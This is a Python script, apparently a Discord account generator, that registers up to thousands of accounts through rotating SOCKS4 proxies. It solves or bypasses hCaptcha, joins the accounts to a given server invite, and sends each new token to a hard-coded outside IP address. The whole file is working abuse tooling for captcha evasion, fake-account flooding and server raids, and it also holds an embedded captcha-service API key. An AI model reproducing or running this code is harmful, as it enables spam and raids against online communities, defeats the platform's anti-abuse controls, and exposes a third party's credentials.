from requests import post
from random import choice
from secrets import token_hex
from string import ascii_letters
from time import sleep as sp,time
from sty import fg
from os import system,get_terminal_size,name
#from secrets import token_hex
from httpx_socks import SyncProxyTransport
from concurrent.futures import ThreadPoolExecutor as tp
#from httpx import post,get
from httpx import Client
from hcapt import bypass,setup

system("")
#key = "c963251deef52cd12b8e96843d3ff128" #serross
key = "f684a5516ffc462283016909e3ab9773" #larina
#key = "4eee11338ded796f167780743e537a23" #theniceday

#hc_a = "9C3RFH12qloOPk5mzADN/JAf+NBQHKmsGhiUUDUsowE8hwQ5Y5qjgas9+/kalq4mZQvBTiDg9wLKbFkwAHF+mZ4rFTcGbnqA3X9aE1DAKJ2pFj9EvgwsC4UY5tW/6RiVdx75G67Dx8LF+TY2d1mG/lux57wee+jIKc/mTcBag8pn2RtcRZ6vRl8DwitqQfAzLlixaF51u125djdZvT13i/7YE/5jQgLYNEuqhMbqfXBtDMlVer9QNgWqic7mWZunIjfHI2FneD7TjBbgRe+cLvjlmr+HA/E4FlITiO/8dZc8L2t8FOgh/CCjvM9M5katdTx0dD8uDzrU46bMVOSKxPi4bVA4+LWA8iEFTl8W5EXrcTewrtDMX3KYZApt5iOuftbt+FrohpuruRwB2klkng8gsv7UQRsd8OIUKf8RoZvpZApYr8rKS4Hx6/s1uISWAXN36zBS+nJh3mb3eD0zPSKiW0mEs3Dv0yXHAoj4510+nSQicxMlWdO4QCrMtAemkD0aH4bA48looRSTVp81rA==oPBaYLEvV7VtkRs7"
hc_a = "wAHi1MOKSosBLK6HVeeBzfbaQknsYZOOkIB/s3TXYK3NzxiIzJ3HzV6uQOMlyTSI1GIVz9AazrmLIgl7NAufVofFaQDhnTL9CNyhqVwlaibJmi6mQrr377HrCaTI7VCWxo1kniMjJDOEz4X29+NH5awd4jH6hPyKIOZhNjWuMrNSKu6ZFLuRSgOiy4c+0idoOSRYiOiX9HK8KkQaHk8EfkR05vRrjPBkaNVKqg1RcpcfREQ06gIS9YzkItTt+2z/aHHZU1rAdJTyJ8oijsq2Mis23zqp9EWQ52H4oWEstionkOct9Z8NgybESmrdNsowi3NXNOoVwWoU4ZEwGCbjG8eO+2HnSP1vPKUi6tT7Z39E2eCMAJJDn9dyenkOuFRcOMmFiMIIIFsTUniyM7EhvSWxWDFvI+4zbx/+TP5pQClZJcLbXinpw1SMk3GVT3S6EG2n/DyLQ0/p3+/CJYbr7sVjdeRLQBGyCMvaOPy+dvaRH+mszz58EoV35sq9835SPRD17jNym9E=UCa12gEu9VIPScd9"
ec=tp(max_workers=int(100000))
pro_list = ["-","\\","|","/"]
pro_num = 0
cap_done = 0
token_done = 0
msg_list = ["[*] by larinax999"]

proxy_list=list()
proxy_num=0
proxy_name=["socks4_100ms_1k.txt","socks4_14K.txt","socks4_serr2.txt","socks4_serr.txt","socks4_a.txt","socks4_nice.txt"]
for pn in proxy_name:
    proxy_list.extend(open(pn, encoding='utf-8').readlines())

setup(proxy_list,hc_a)

def register(captcha, invite):
    global token_done
    username = f"VanillaOwO {''.join([choice(ascii_letters) for _ in range(3)])}"
    data = {
        "captcha_key": captcha,
        "consent": True,
        #"email": f"{token_hex(25)}@gmail.com",
        "date_of_birth": "2001-03-05",
        "fingerprint": "",
        "gift_code_sku_id": None,
        "invite": invite,
        "username": username
    }
    while True:
        p = f"socks4://{choice(proxy_list)}" # pip install pysocks
        try:
            headers = {"Host":"discord.com","Connection":"keep-alive","sec-ch-ua":'"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',"X-Super-Properties":"eyJvcyI6Ik1hYyBPUyBYIiwiYnJvd3NlciI6IkNocm9tZSIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzE1XzcpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85Mi4wLjQ1MTUuMTMxIFNhZmFyaS81MzcuMzYiLCJicm93c2VyX3ZlcnNpb24iOiI5Mi4wLjQ1MTUuMTMxIiwib3NfdmVyc2lvbiI6IjEwLjE1LjciLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTI3OTIsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9","X-Fingerprint":"" ,"Accept-Language":"en-US","sec-ch-ua-mobile":"?0","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36","Content-Type":"application/json","Authorization":"undefined","Accept":"*/*","Origin":"https://discord.com","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://discord.com/register","X-Debug-Options":"bugReporterEnabled","Accept-Encoding":"gzip, deflate, br","cookie": "OptanonConsent=version=6.17.0; locale=th"} #,"Cookie":f"__dcfduid={dcfduid}; __sdcfduid={sdcfduid}"
            with Client(transport=SyncProxyTransport.from_url(p)) as client:
                textres = client.post("https://discord.com/api/v9/auth/register",headers=headers, json=data, timeout=4).json()
            token = textres["token"]
            msg_list.append(f"[token gen] username : {username} token : {token[:35]}...")
            token_done +=1
            try :
                post(f"http://185.117.3.23:4378/?token={token}&guild={gi}&chid={ci}", timeout=3)
            except:
                pass
            with open(f"token_{invite}.txt", "a+") as f:
                f.write(f"{token}\n")
                f.close()
            return
        except:# Exception as e
            try :
                if token:
                    break
            except:
                pass
            try:
                textres['captcha_key']
                break
            except:
                pass
            '''
            try :
                print(f"[token gen] fail to gen token | {textres}")
            except:
                print("[token gen] fail to gen token | i thing proxy")
            '''

def reg(invite,tt):
    global cap_done
    c=post('http://api.capmonster.cloud/createTask', json={"clientKey":key,"task":{"type":"HCaptchaTaskProxyless","userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Edg/92.0.902.73","websiteURL":f"https://discord.com/invite/{invite}","websiteKey":"f5561ba9-8f1e-40ca-9b5b-a0b3f719ef34"}}).json()['taskId']
    sp(0.5)
    while True:
        d = post('http://api.capmonster.cloud/getTaskResult', json={"clientKey":key, 'taskId': c}).json()
        if d['status'] == 'ready':
            msg_list.append("[captcha] ok")
            cap_done+=1
            while True:
                #print(d)
                if tt <= int(time()):
                    break
                sp(0.5)
            register(d['solution']['gRecaptchaResponse'],invite)
            break
def reg_free(invite,tt):
    global cap_done
    cap = bypass()
    msg_list.append("[captcha] ok")
    cap_done+=1
    while True:
        #print(d)
        if tt <= int(time()):
            break
        sp(0.5)
    register(cap,invite)
    
def make_c(c,msg):
    return f"{fg(int(c))}{msg}{fg.rs}"
    
def printc(text,textm=""):
    #print(get_terminal_size().columns//2)
    for l in text.splitlines():
        print(f"{textm} {l.center(get_terminal_size().columns-3)+fg.rs}")

def printc2(text):
    wi = (get_terminal_size().columns-3) //2
    for l in text.splitlines():
        print(f"{l: >{wi}}")

def clear():
    system('cls' if name=='nt' else 'clear')

def inputc(text):
    return input(f"{''.center(get_terminal_size().columns//3)}{text} >> ")
'''
gi=input("guild id : ")
ci=input("chid : ")
i=input("invite : ")
j=int(input("amount of users : "))
t=input("join in (sec) : ")
'''
# 824718268501721089
'''
gi="0"
ci="0"
i="D35BWUKHWs"
j=1000
t="0"
'''
# kkkki
gi="0"
ci="0"
i="X4nh4ASzWJ"
j=100
t="0"

def a():
    tt=int(time()+int(t))
    for b in range(int(j)):
        #reg(i,tt)
        #reg_free(i,tt)
        ec.submit(reg,i,tt)
        #ec.submit(reg_free,i,tt)
        if b == 500 or b == 1000 or b == 1500 or b == 2000 or b == 2500 or b == 3000:
            msg_list.append("[main] sleep 5 sec")
            sp(5)

ec.submit(a)
clear()
printc("--===[*]===--")
printc2(f"[*] guild {make_c(9 if gi == '0'else 118,gi)}\n[*] channel {make_c(9 if ci == '0'else 118,ci)}\n[*] discord.gg/{make_c(118,i)}\n[*] amount {make_c(118,j)} users\n[*] join guild in {make_c(9 if t == '0'else 118,t)} sec\n[*] {make_c(118,len(proxy_list))} proxy")
printc("--===[*]===--")

def update():
    global pro_num,msg_list
    try:
        pro_c=pro_t=pro_list[pro_num]
        pro_num+=1
    except:
        pro_c=pro_t=pro_list[0]
        pro_num=1
    if cap_done >= j:
        pro_c = "*"
    if token_done >= j:
        pro_t = "*"
    #print(msg_list[10:-1])
    if len(msg_list) > 9:
        msg_list = msg_list[1:9]
    text = f'[{pro_c}] captcha successfully {cap_done}/{j} [{pro_t}] token successfully {token_done}/{j}\n------==========[*]==========------\n' + "\n".join(msg_list[slice(0, 10)])
    printc(text)
    a = len(text.split("\n")) +1
    print("\033[F"*a)
    
    
while True:
    update()
    if token_done >= j:
        break
    sp(0.5)
    #cap_done+=1
